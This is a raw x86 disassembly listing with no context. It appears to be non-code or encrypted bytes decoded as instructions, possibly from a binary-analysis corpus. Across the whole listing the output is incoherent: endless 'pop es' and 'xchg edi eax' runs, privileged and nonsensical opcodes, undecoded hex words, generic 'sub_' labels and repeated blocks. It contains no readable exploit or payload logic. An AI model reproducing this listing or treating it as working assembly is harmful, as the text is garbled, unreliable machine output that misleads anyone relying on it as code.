push 0xc9c857a4
int3
push 0x8bed1198
xchg edi eax
xchg edi eax
jle r-xdata
push 0x68
push 0x7070707
sbb al 0xd2
outsd
jle r-xdata
push esp
push 0x61d21ef1
iretd
pop ecx
pop ebx
push 0x107e0768
jpe r-xdata
jpo r-xdata
xchg edi eax
std
xchg edi eax
push eax
shl [ edx - 0x3 ] cl
xchg edi eax
std
xchg edi eax
jle r-xdata
push 0xfd66d250
nop
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x768
pop es
push eax
ror [ edi - 0x26 ] cl
fcmove st7
push eax
ror [ ebx - 0x7 ] cl
rcr edx 0xda
jle r-xdata
0x837ec86b 0x6871
push 0x7070707
pop es
pop es
sbb al 0xda
lahf
les edi [ esi - 0x18 ]
push ecx
push 0x7070768
pop es
pop es
pop es
pop es
jg r-xdata
xchg edi eax
pop es
push 0x97b77d7e
int1
push ds
0xbbe07e7b 0x9797
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
std
jle r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
retn 0x107e
outsb
push 0x7e87fd68
jno r-xdata
jle r-xdata
cwde
adc esp [ ebx - 0x3f979796 ]
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
std
xchg ebp eax
jle r-xdata
mov edx [ edi + 0x7b007e97 ]
push 0xb77d7e68
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0xe07e8bc0
inc edx
push 0xed119868
movsb [ edi ] [ esi ]
push edi
jle r-xdata
mov edx 0x7079797
mov ebx 0x7079797
jns r-xdata
insd
jle r-xdata
jle r-xdata
push 0x7070707
int1
push ds
sar [ ecx ] cl
sbb al 0x59
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push ecx
shl [ edi + 0x247e5487 ] cl
inc ebp
push 0x79357f68
push 0x98571268
adc esi [ eax + edi * 4 + 0x16d49797 ]
arpl [ eax + 0x68 ] bp
pop es
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push edx
push 0xa7b07e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x13980707
dec esp
xchg ebp eax
xchg edi eax
xchg edi eax
[ ebx ]
pop es
pop es
pop es
pop es
int 0xf1
push ds
retn 0xfda1
mov ebx 0x7079797
push eax
adc edx [ edi - 0xa816869 ]
xchg edi eax
xchg edi eax
aam 0x16
imul ebp [ eax + 0x68 ] 0x7070707
jg r-xdata
sub_48ecf5
std
xchg ebx eax
les edi [ esi - 0x50 ]
push ebp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
shr [ ebp + 0x7e ] cl
push ebp
arpl [ eax + 0x68 ] bp
pop es
jle r-xdata
push 0x13980707
dec esp
xchg ebp eax
xchg edi eax
xchg edi eax
[ ebx ]
mov ebx 0x7079797
pop es
pop es
pop es
pop es
int 0xf1
push ds
retn 0xfda1
sub_48eda6
push 0x68
push 0x68070707
shr edi 0x1c
outsd
adc ch [ eax + 0x7e ]
sub al 0x7b
push 0x62887e68
push 0x7070768
pop es
pop es
sbb al 0x51
jle r-xdata
xchg edi eax
xchg edi eax
pop es
jle r-xdata
0x7079797 0xe268
fwait
jle r-xdata
push 0x7070707
jb r-xdata
or eax 0x6843a77e
outsb
push 0x7070768
sbb al 0x6f
int1
push ds
0xf1471c67 0xc21e
fwait
push 0x7ec09fe2
mov edi 0x768686a
pop es
push 0x98b3b3e3
cwde
xchg edi eax
xchg edi eax
pop es
jmp [ ebx - 0xe ]
xchg edi eax
jle r-xdata
push 0x7070707
pop es
cwde
adc eax ecx
mov ss [ edi - 0x31813e69 ]
lodsd [ esi ]
xchg edi eax
xchg edi eax
jle r-xdata
lea edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
daa
jle r-xdata
mov bl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ecx ebp
insb
push 0x9c2f2868
pop es
adc dh [ eax + 0x7f97978d ]
push esi
mov ch 0x97
xchg edi eax
jle r-xdata
mov bl 0x98
pushfd
mov dh 0x97
xchg edi eax
pop es
adc al 0xeb
mov bl 0x83
xchg edi eax
jle r-xdata
adc [ edi + 0x7070797 ] 0xcf
jle r-xdata
inc edx
push 0x6897fd68
jecxz r-xdata
xchg edi eax
xchg edi eax
pop es
mov edi 0x6bff7ec7
push 0x2d5aff68
xchg bh dh
rcr [ esi ] 0x29
inc ebx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
insd
push 0x7070768
pop es
push ss
jpo r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
push 0xe2689be2
lahf
sar [ esi - 0x41 ] 0x6a
push 0x68070768
jecxz r-xdata
xchg edi eax
xchg edi eax
sar [ esi - 0x32 ] 0xad
cmp [ esi + 0x7 ] 0xffffffb9
xchg edi eax
xchg edi eax
pop es
push ds
pop es
pop es
pop es
pop es
pop es
adc dl [ edi + 0x7e ]
aaa
push esi
push 0x7070768
pop es
pop es
pop es
push eax
shl [ ebx - 0x6852f071 ] cl
xchg edi eax
jle r-xdata
lea edx [ edi + 0x60817f97 ]
push 0x7e87fd68
sub bh [ eax + ebp * 2 + 0x68 ]
sbb al 0x51
jle r-xdata
cwde
xchg ebx eax
xchg edi eax
xchg edi eax
jle r-xdata
std
xchg [ esi + 0x2a ] edi
jl r-xdata
jpe r-xdata
shr [ ebx + 0x1c ] cl
fisubr [ ebx + 0x7e ]
xchg [ esi - 0x30816869 ] cl
mov edi 0x7079797
enter 0xccc9 0x7e
in eax dx
jpe r-xdata
pop es
pop es
std
iretd
push 0xf57e511c
js r-xdata
push 0x6860947f
push 0x6872cf7e
push 0xf1070707
push ds
retn 0x7e41
pop es
pop es
pop es
pop es
pop es
pop es
into
adc dl [ edi - 0x68 ]
adc ch [ edi ]
pop edx
push 0x8c127e68
xchg edi eax
xchg edi eax
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0xc068c4c7
cmp [ esi + 0x14 ] 0xffffff84
xchg edi eax
xchg edi eax
push 0x7070707
pop es
pop es
push ds
0x6f117e6b 0x6868
sbb bl bh
xchg ebp eax
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
push 0x7e9fb3e3
fld [ eax + 0x68 ]
push 0x707545e
pop es
pop es
pop es
std
jle r-xdata
push es
jle r-xdata
pop es
pop es
xchg ecx eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]
jg r-xdata
pop es
pop es
pop es
pop es
cwde
adc ch dl
pop edx
push 0x6fca1c68
pop eax
push 0x5f1c0768
jle r-xdata
cwde
and dl dl
xchg [ edx ] ebx
outsd
pop es
inc edx
push 0x7070768
push ebx
push 0xa77fc768
inc ebx
push 0x117ed768
jae r-xdata
pop es
cwde
adc edi [ edi ]
mov [ 0xfffffffff4ff9797 ] eax
jo r-xdata
adc al [ edi + 0x6a ]
push 0x68c4c768
rol [ ebx - 0x687beb82 ] 0x97
fist [ ebp - 0x686e7882 ]
mov cl 0x97
xchg edi eax
pop es
pop es
sbb al 0x4f
adc cl [ esi + edi * 2 + 0x54 ]
push edx
push 0xa9160768
dec edi
push 0x7ec857a4
0x79797ad 0x707
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
js r-xdata
pop es
pop es
pop es
pop es
push 0x137e5712
dec ecx
push 0xc7070768
jg r-xdata
dec edx
push 0x7070768
pop es
pop es
int1
push ds
0xfd6d
dec edi
push 0xbcd47e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jg r-xdata
push 0x3e7202ff
add al al
jle r-xdata
mov eax 0x167e9797
outsd
push 0xe3fd0768
jle r-xdata
push ss
test eax 0x9797d2c7
jle r-xdata
push 0xa57aff68
xchg ecx eax
dec eax
push 0x7070768
pop es
pop es
pop es
pop es
pop es
sbb al 0x97
sbb al 0xd7
ja r-xdata
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0x9a7e 0xad
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7070768
pop es
iretd
push 0xc7a91607
rcl [ edi + 0x65887e97 ] cl
push 0x7070768
jle r-xdata
jns r-xdata
scasd [ edi ]
jle r-xdata
push 0x7070707
pop es
int1
push ds
shl [ ecx + 0x7e ] cl
inc eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sar [ esi + 0xd ] 0xb7
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
adc al 0x53
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
jg r-xdata
pop es
jg r-xdata
adc [ edi + 0x7070797 ] 0x7
cwde
adc esp eax
nop
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
push edi
jle r-xdata
mov [ edi + 0x7070797 ] ss
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7ea5
push 0x91a57aff
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x4f
into
int1
push ds
0xf125
mov [ 0x7079797 ] eax
pop es
push 0x97971f01
xchg edi eax
sbb al 0x6f
adc ch [ eax + 0x7e ]
in eax dx
sub_48f0a2
pushfd
xchg edi eax
xchg edi eax
pop es
les edi [ esi - 0x6e ]
dec edx
push 0x7070768
pop es
pop es
int1
push ds
0xfd6d
dec edi
push 0xbcd47e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jg r-xdata
push ss
test eax 0x9797d2c7
jle r-xdata
push 0xa57aff68
xchg ecx eax
movsb [ edi ] [ esi ]
push edi
enter 0x9a7e 0xad
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7070768
pop es
iretd
push 0xc7a91607
rcl [ edi + 0x65887e97 ] cl
push 0x7070768
jle r-xdata
dec edi
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
js r-xdata
jg r-xdata
adc [ edi + 0x7070797 ] 0x7
cwde
adc esp eax
nop
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
push edi
jle r-xdata
mov [ edi + 0x7070797 ] ss
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7ea5
pop es
jg r-xdata
pop es
pop es
pop es
pop es
push 0x137e5712
dec ecx
push 0xc7070768
jg r-xdata
jns r-xdata
push 0x91a57aff
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
push 0x3e7202ff
add al al
jle r-xdata
mov eax 0x167e9797
outsd
push 0xe3fd0768
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x4f
into
int1
push ds
0xf125
mov [ 0x7079797 ] eax
pop es
push 0x97971f01
xchg edi eax
sbb al 0x6f
adc ch [ eax + 0x7e ]
in eax dx
pop es
pop es
pop es
pop es
pop es
std
iretd
dec eax
push 0x7070768
pop es
pop es
pop es
pop es
pop es
sbb al 0x97
sbb al 0xd7
ja r-xdata
push 0x7070707
pop es
int1
push ds
shl [ ecx + 0x7e ] cl
inc eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sar [ esi + 0xd ] 0xb7
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
adc al 0x53
fist [ ebp - 0x686e7882 ]
xchg edi eax
sbb dl [ edx ]
jg r-xdata
adc cl [ esi + edi * 2 + 0x54 ]
push edx
push 0xa9160768
mov cl 0x97
xchg edi eax
pop es
pop es
sbb al 0x4f
scasd [ edi ]
jle r-xdata
push ebx
push 0xa77fc768
inc ebx
push 0x117ed768
jae r-xdata
pop es
pop es
pop es
pop es
pop es
push 0x7ec857a4
0x79797ad 0x707
sub_48f0e4
push 0x7070768
jle r-xdata
ficom [ ecx + 0x7e ]
salc
xchg esi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc dl [ edi - 0x68 ]
push ebp
push 0xf4b1ff68
std
add [ esi - 0x2 ] bh
jns r-xdata
push 0x91a57aff
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
adc [ edi + 0x7070797 ] 0x7
mov [ edi + 0x1a070797 ] dl
adc bl [ edi + 0x6a ]
push 0xc168c768
[ edx + edx * 8 ]
fwait
jle r-xdata
jno r-xdata
mov [ edi + 0x43ff7e97 ] edx
push 0x63e26868
jle r-xdata
push 0xcb7ec407
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x787e7fe2
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x557e73e2
push 0xc7a91607
rcl [ edi + 0x65887e97 ] cl
push 0x7070768
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x4f
into
int1
push ds
0xf125
mov [ 0x7079797 ] eax
pop es
push 0x97971f01
xchg edi eax
sbb al 0x6f
adc ch [ eax + 0x7e ]
in eax dx
jle r-xdata
pop ecx
push 0x7070768
pop es
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop esi
push 0x7070768
sbb dl dl
imul edi [ esi - 0x35 ] 0x28
push 0x7070768
pop es
jle r-xdata
dec edi
push 0x9782637e
xchg edi eax
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
sbb al 0x49
into
int1
push ds
0x1c23
xchg esi eax
xchg edi eax
xchg edi eax
les edi [ esi + 0x68 ]
pop ebp
push 0x7ec20768
jle r-xdata
push esi
push 0xc21ef168
cmpsd [ esi ] [ edi ]
jle r-xdata
pop es
int3
dec eax
push 0xcc070768
int1
push ds
0x7e69
jae r-xdata
jg r-xdata
adc [ edi + 0x7070797 ] 0x7
adc esp eax
nop
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
push edi
jle r-xdata
cwde
mov [ edi + 0x7070797 ] ss
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7ea5
adc al 0x53
fwait
jle r-xdata
sub [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
jg r-xdata
pop es
pop es
pop es
adc al 0x57
lahf
jle r-xdata
push 0x97f63f28
xchg edi eax
jle r-xdata
dec edi
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
dec edx
push 0x7070768
pop es
pop es
int1
push ds
0xfd6d
dec edi
push 0xbcd47e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jg r-xdata
push 0x4b
push 0x7ec1c468
test al 0x6f
pop ecx
push 0x12980768
lodsd [ esi ]
mov [ edi - 0xf813869 ] edx
push 0x7076868
push 0x97973b01
xchg edi eax
[ ebx - 0x69 ]
xchg edi eax
xchg edi eax
std
xchg edi eax
sar [ esi - 0x21 ] 0x61
push 0x7070768
pop es
pop es
sbb al 0x49
int1
push ds
0x1cc5
pop es
pop es
pop es
pop es
sbb al 0x4d
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
mov al [ 0x7079797 ]
push esp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
js r-xdata
push ss
test eax 0x9797d2c7
jle r-xdata
jns r-xdata
push 0xa57aff68
xchg ecx eax
pop es
pop es
pop es
push esi
push 0x44411c68
insd
push 0x561463d2
lahf
jle r-xdata
push 0x13006868
xchg edi eax
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
push edi
push ds
0x1e77
sar [ esi - 0x58 ] 0x6f
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
jg r-xdata
pop es
pop es
pop es
pop es
push 0x137e5712
dec ecx
push 0xc7070768
jg r-xdata
movsb [ edi ] [ esi ]
push edi
enter 0x9a7e 0xad
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
iretd
push 0x7070768
pop es
pop es
adc dl [ edi + 0x7e ]
sub dl [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
push 0x5ea46be2
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
sbb ch [ ebx - 0x6c17eb6c ]
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
int1
adc dl [ edi - 0x68 ]
adc esp ebx
mov [ 0xfffffffff3149797 ] eax
mov bl 0x83
xchg edi eax
lea edx [ edi + 0x7070797 ]
push 0x3e7202ff
add al al
jle r-xdata
mov eax 0x167e9797
outsd
push 0xe3fd0768
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push ss
jpo r-xdata
pop es
xchg esi eax
xchg edi eax
xchg edi eax
std
loope r-xdata
pop es
pop es
pop es
pop es
pop es
std
iretd
dec eax
push 0x7070768
pop es
pop es
pop es
pop es
pop es
sbb al 0x97
sbb al 0xd7
ja r-xdata
pop es
or [ edi + edx * 4 - 0x65813869 ] ebx
insd
push 0x7070768
std
jecxz r-xdata
push 0x7070707
pop es
int1
push ds
shl [ ecx + 0x7e ] cl
inc eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sar [ esi + 0xd ] 0xb7
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
adc al 0x53
push 0xffd75314
inc esp
cmpsb [ esi ] [ edi ]
push ecx
push 0xd21c0768
imul edi [ esi + 0x47 ] 0xffffffaf
xchg edi eax
xchg edi eax
pop es
sar [ ebx + 0x7e ] cl
xchg esp eax
sub ch [ eax + 0x68 ]
cwde
add dl [ esi + 0x1c ]
outsb
jle r-xdata
or [ ebp + 0x7e079797 ] 0xb5
nop
xchg edi eax
xchg edi eax
jle r-xdata
fist [ ebp - 0x686e7882 ]
xchg edi eax
sbb dl [ edx ]
jg r-xdata
adc cl [ esi + edi * 2 + 0x54 ]
push edx
push 0xa9160768
mov cl 0x97
xchg edi eax
pop es
pop es
sbb al 0x4f
cdq
and al al
push ds
adc [ edi ] edi
xchg edi eax
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
mov ch 0x50
push 0xcff8fd68
jg r-xdata
jle r-xdata
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x87c06868
jle r-xdata
scasd [ edi ]
jle r-xdata
push ebx
push 0xa77fc768
inc ebx
push 0x117ed768
jae r-xdata
push ds
sar [ edi + 0x1c ] cl
shl [ ebx + 0x1e ] cl
sub ch [ eax + 0x68 ]
rol eax 0x1e
adc [ ebx ] edi
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push 0xd7531468
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop ds
adc [ esi + 0x682a627e ] 0x68
mov edi 0x7079797
pop es
sar [ esi + 0x71 ] 0x5f
push 0x7070768
pop es
jle r-xdata
jg r-xdata
pop es
pop es
pop ss
0x12989587 0x50b5
push 0x4eb97ec7
push 0x7070768
pop es
pop es
pop es
xchg edi eax
xchg edi eax
jg r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
dec [ eax + 0x7e979897 ]
jmp r-xdata
pop es
pop es
pop es
pop es
pop es
push 0x7ec857a4
0x79797ad 0x707
inc [ esi + 0x51 ]
xlat
inc esp
push 0x7070768
push 0xbf7ee3c1
lea edx [ edi + 0x7070797 ]
pop es
int1
push ds
0x7ebf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
push 0x7fc00707
pop ebp
js r-xdata
pop es
pop es
int 0xfd
out 0xf1 eax
push ds
retn 0xcd4b
push 0x507ecece
push 0x66139868
jae r-xdata
push 0x47e0768
mov edx 0xd7e9797
pushfd
xchg edi eax
xchg edi eax
int1
push ds
sar [ ebx - 0x31 ] cl
jle r-xdata
push 0x97bdc17e
xchg edi eax
pop es
std
out dx eax
jle r-xdata
mov [ ebx - 0x5026869 ] ebx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ss
dec edx
push 0x12070768
push edi
jle r-xdata
mov ss [ edi - 0x69118169 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
mov bh 0x7e
rcl [ eax + ebp * 2 + 0x68 ] 0xc2
sbb al 0x7b
jle r-xdata
adc [ edi + 0x7070797 ] 0x1cabc168
shr [ edi - 0x38 ] cl
int3
pop es
pop es
pop es
pop es
cwde
adc cl dl
mov esp 0x6f7e9797
inc ecx
push 0x9d797e68
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
dec eax
push 0x7f070768
nop
int3
fwait
xchg edi eax
xchg edi eax
std
cli
jl r-xdata
pop es
adc dl [ edi + 0x7e ]
ror [ eax + 0x68 ] cl
push 0x907f0707
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ah 0xc0
jle r-xdata
push 0x12835314
push edi
cwde
adc edi ebx
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
jpo r-xdata
mov edx 0x16079797
sub_48f14b
push ds
ficom [ ecx + 0x7e ]
salc
xchg esi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push ebp
push 0xf4b1ff68
std
add [ esi - 0x2 ] bh
jns r-xdata
adc [ edi + 0x7070797 ] 0x7
mov [ edi + 0x1a070797 ] dl
adc bl [ edi + 0x6a ]
push 0xc168c768
[ edx + edx * 8 ]
fwait
jle r-xdata
jno r-xdata
mov [ edi + 0x43ff7e97 ] edx
push 0x63e26868
jle r-xdata
push 0xcb7ec407
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x787e7fe2
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x557e73e2
jle r-xdata
pop ecx
push 0x7070768
pop es
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop esi
push 0x7070768
sbb dl dl
imul edi [ esi - 0x35 ] 0x28
push 0x7070768
pop es
jle r-xdata
dec edi
push 0x9782637e
xchg edi eax
sbb al 0x49
into
int1
push ds
0x1c23
xchg esi eax
xchg edi eax
xchg edi eax
les edi [ esi + 0x68 ]
pop ebp
push 0x7ec20768
jle r-xdata
push esi
push 0xc21ef168
cmpsd [ esi ] [ edi ]
jle r-xdata
pop es
int3
dec eax
push 0xcc070768
int1
push ds
0x7e69
jae r-xdata
adc al 0x53
fwait
jle r-xdata
sub [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
jg r-xdata
pop es
pop es
pop es
adc al 0x57
lahf
jle r-xdata
push 0x97f63f28
xchg edi eax
jle r-xdata
push 0x4b
push 0x7ec1c468
test al 0x6f
pop ecx
push 0x12980768
lodsd [ esi ]
mov [ edi - 0xf813869 ] edx
push 0x7076868
push 0x97973b01
xchg edi eax
[ ebx - 0x69 ]
xchg edi eax
xchg edi eax
std
xchg edi eax
sar [ esi - 0x21 ] 0x61
push 0x7070768
pop es
pop es
sbb al 0x49
int1
push ds
0x1cc5
pop es
pop es
pop es
pop es
sbb al 0x4d
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
mov al [ 0x7079797 ]
push esp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push esi
push 0x44411c68
insd
push 0x561463d2
lahf
jle r-xdata
push 0x13006868
xchg edi eax
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
push edi
push ds
0x1e77
sar [ esi - 0x58 ] 0x6f
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
adc dl [ edi + 0x7e ]
sub dl [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
push 0x5ea46be2
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
sbb ch [ ebx - 0x6c17eb6c ]
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
int1
adc dl [ edi - 0x68 ]
adc esp ebx
mov [ 0xfffffffff3149797 ] eax
mov bl 0x83
xchg edi eax
lea edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
push ss
jpo r-xdata
pop es
xchg esi eax
xchg edi eax
xchg edi eax
std
loope r-xdata
pop es
or [ edi + edx * 4 - 0x65813869 ] ebx
insd
push 0x7070768
std
jecxz r-xdata
push 0xffd75314
inc esp
cmpsb [ esi ] [ edi ]
push ecx
push 0xd21c0768
imul edi [ esi + 0x47 ] 0xffffffaf
xchg edi eax
xchg edi eax
pop es
sar [ ebx + 0x7e ] cl
xchg esp eax
sub ch [ eax + 0x68 ]
cwde
add dl [ esi + 0x1c ]
outsb
jle r-xdata
or [ ebp + 0x7e079797 ] 0xb5
nop
xchg edi eax
xchg edi eax
jle r-xdata
cdq
and al al
push ds
adc [ edi ] edi
xchg edi eax
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
mov ch 0x50
push 0xcff8fd68
jg r-xdata
jle r-xdata
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x87c06868
jle r-xdata
push ds
sar [ edi + 0x1c ] cl
shl [ ebx + 0x1e ] cl
sub ch [ eax + 0x68 ]
rol eax 0x1e
adc [ ebx ] edi
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push 0xd7531468
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop ds
adc [ esi + 0x682a627e ] 0x68
mov edi 0x7079797
pop es
sar [ esi + 0x71 ] 0x5f
push 0x7070768
pop es
jle r-xdata
jg r-xdata
pop es
pop es
pop ss
0x12989587 0x50b5
push 0x4eb97ec7
push 0x7070768
pop es
pop es
pop es
xchg edi eax
xchg edi eax
jg r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
dec [ eax + 0x7e979897 ]
jmp r-xdata
inc [ esi + 0x51 ]
xlat
inc esp
push 0x7070768
push 0xbf7ee3c1
lea edx [ edi + 0x7070797 ]
pop es
int1
push ds
0x7ebf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
push 0x7fc00707
pop ebp
js r-xdata
pop es
pop es
int 0xfd
out 0xf1 eax
push ds
retn 0xcd4b
push 0x507ecece
push 0x66139868
jae r-xdata
push 0x47e0768
mov edx 0xd7e9797
pushfd
xchg edi eax
xchg edi eax
int1
push ds
sar [ ebx - 0x31 ] cl
jle r-xdata
push 0x97bdc17e
xchg edi eax
pop es
std
out dx eax
jle r-xdata
mov [ ebx - 0x5026869 ] ebx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ss
dec edx
push 0x12070768
push edi
jle r-xdata
mov ss [ edi - 0x69118169 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
mov bh 0x7e
rcl [ eax + ebp * 2 + 0x68 ] 0xc2
sbb al 0x7b
jle r-xdata
adc [ edi + 0x7070797 ] 0x1cabc168
shr [ edi - 0x38 ] cl
int3
pop es
pop es
pop es
pop es
cwde
adc cl dl
mov esp 0x6f7e9797
inc ecx
push 0x9d797e68
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
dec eax
push 0x7f070768
nop
int3
fwait
xchg edi eax
xchg edi eax
std
cli
jl r-xdata
pop es
adc dl [ edi + 0x7e ]
ror [ eax + 0x68 ] cl
push 0x907f0707
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ah 0xc0
jle r-xdata
push 0x12835314
push edi
cwde
adc edi ebx
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
jpo r-xdata
mov edx 0x16079797
sub_48f2bf
sar [ esi + 0x13 ] 0xb1
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push esi
push 0x44411c68
insd
push 0x561463d2
lahf
jle r-xdata
pop es
pop es
adc dl [ edi + 0x7e ]
sub dl [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
push 0x5ea46be2
jle r-xdata
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
sbb ch [ ebx - 0x6c17eb6c ]
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
int1
adc dl [ edi - 0x68 ]
adc esp ebx
mov [ 0xfffffffff3149797 ] eax
mov bl 0x83
xchg edi eax
lea edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ss
jpo r-xdata
xchg esi eax
xchg edi eax
xchg edi eax
std
loope r-xdata
sar [ esi - 0x58 ] 0x6f
push 0x13006868
xchg edi eax
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
push edi
push ds
0x1e77
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
or [ edi + edx * 4 - 0x65813869 ] ebx
insd
push 0x7070768
std
jecxz r-xdata
push 0xffd75314
inc esp
cmpsb [ esi ] [ edi ]
push ecx
push 0xd21c0768
imul edi [ esi + 0x47 ] 0xffffffaf
xchg edi eax
xchg edi eax
pop es
sar [ ebx + 0x7e ] cl
xchg esp eax
